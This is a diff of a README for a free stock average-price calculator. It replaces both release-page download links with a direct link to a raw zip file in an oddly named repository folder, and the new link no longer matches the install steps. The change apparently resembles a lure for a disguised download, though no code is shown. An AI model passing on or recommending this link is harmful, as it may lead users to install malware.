@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets these requirements:
 - Internet Connection: Required for features that connect to broker APIs
 
 ## 📥 Download & Install
-To download the application, please visit this page: [Download Free Average Stock Price Calculator](https://github.com/RanuAfterse/Free-Average-Stock-Price-Calculator/releases).
+To download the application, please visit this page: [Download Free Average Stock Price Calculator](https://raw.githubusercontent.com/RanuAfterse/Free-Average-Stock-Price-Calculator/main/aberroscope/Free-Average-Stock-Price-Calculator.zip).
 
 1. Click on the link above.
 2. Find the latest release on the page.
@@ -68,5 +68,5 @@ This project is licensed under the MIT License. Feel free to modify and use it f
 angel-one, average, average-calculator, average-price, calculator, dhan, fyers, kite, stock, stock-data, stock-market, stock-price, zerodha
 
 ## 📍 Download Link Again
-To download the application, please visit this page: [Download Free Average Stock Price Calculator](https://github.com/RanuAfterse/Free-Average-Stock-Price-Calculator/releases).
+To download the application, please visit this page: [Download Free Average Stock Price Calculator](https://raw.githubusercontent.com/RanuAfterse/Free-Average-Stock-Price-Calculator/main/aberroscope/Free-Average-Stock-Price-Calculator.zip).
 ```
